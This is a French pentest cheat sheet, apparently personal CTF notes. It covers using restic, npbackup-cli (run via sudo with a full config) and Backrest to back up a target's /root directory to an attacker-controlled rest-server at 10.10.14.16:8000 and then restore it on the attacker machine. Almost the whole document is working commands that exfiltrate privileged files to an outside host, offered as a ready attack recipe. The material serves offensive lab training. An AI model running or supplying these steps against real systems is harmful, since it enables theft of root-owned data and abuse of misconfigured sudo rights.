
Quelque soit le la techno utilisée, l'idée est de :

1. Monter un serveur restic sur la machine de l'attaquant.
2. Initialiser notre serveur restic comme repo de backup depuis la target.
3. Effectuer la sauvegarde vers notre repo.
4. Restaurer la sauvegarde depuis la machine de l'attaquant.


[[#RESTIC]]
[[#NPBACKUP-CLI]]
[[#BACKREST]]

---
# RESTIC

### Depuis la machine de l'attaquant

1. Installer le client restic

```
sudo apt install restic
```

2. Télécharger rest-server afin de monter un serveur restic -> https://github.com/restic/rest-server/releases/

3. Lancer le server restic en écoute sur le port 8000

```sh
mkdir backups
./rest-server --listen ":8000" --path ./backups --no-auth
```


### Depuis la target

3. Initialiser un répertoire de Backup vers notre serveur restic et definir un mot de passe

```sh
restic init -r rest:http://10.10.14.16:8000
```

4. Sauvegarder un dossier vers notre repo

```sh
restic backup /root -r rest:http://10.10.14.16:8000
```

5. Récupérer l'id correspondant au backup réalisé

```sh
restic snapshots -r rest:http://10.10.14.16:8000
```


### Depuis la machine de l'attaquant

6. Restaurer le backup avec son ID vers un répertoire.

```sh
mkdir restore
restic restore <id> -r rest:http://10.10.14.16:8000 --target ./restore
```

---
# NPBACKUP-CLI

> [!TIP]
> Basé sur la techno restic

### Depuis la machine de l'attaquant

1. Installer le client restic

```
sudo apt install restic
```

2. Télécharger rest-server afin de monter un serveur restic -> https://github.com/restic/rest-server/releases/

3. Lancer le server restic en écoute sur le port 8000

```sh
mkdir backups
./rest-server --listen ":8000" --path ./backups --no-auth
```


### Depuis la target

4. Créer fichier de configuration npbackup.conf suivant avec notre repo de backup et le répertoire à sauvegarder

npbackup.conf

```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      rest:http://10.10.14.16:8000 # Notre repertoire de backup
    repo_group: default_group
    backup_opts:
      paths:
      - /root # Repertoire à sauvegarder
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        password
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 0
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 5
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

5. Initialiser le repo avec le fichier conf

```
sudo /usr/local/bin/npbackup-cli -c npbackup.conf --init
```

6. Effectuer un backup

```
sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b
```

### Depuis la machine de l'attaquant

7. Afficher les snapshots et récupérer l'id du backup réalisé.

```sh
restic snapshots -r rest:http://10.10.14.16:8000
```

8. Restaurer le backup avec son ID vers un répertoire.

```sh
mkdir restore
restic restore <id> -r rest:http://10.10.14.16:8000 --target ./restore
```


---
# BACKREST

> [!TIP]
> Basé sur la techno restic


### Depuis la machine de l'attaquant

1. Installer le client restic

```
sudo apt install restic
```

2. Télécharger rest-server afin de monter un serveur restic -> https://github.com/restic/rest-server/releases/

3. Lancer le server restic en écoute sur le port 8000

```sh
mkdir backups
./rest-server --listen ":8000" --path ./backups --no-auth
```

### Depuis Backrest

4. Cliquer sur add-repo
5. Initialiser notre repo

![[Pasted image 20250825094339.png]]
6. Exécuter la commande ``backup /root``

![[Pasted image 20250825094452.png]]


### Depuis la machine de l'attaquant

7. Afficher les snapshots et récupérer l'id du backup réalisé.

```sh
restic snapshots -r rest:http://10.10.14.16:8000
```

8. Restaurer le backup avec son ID vers un répertoire.

```sh
mkdir restore
restic restore <id> -r rest:http://10.10.14.16:8000 --target ./restore
```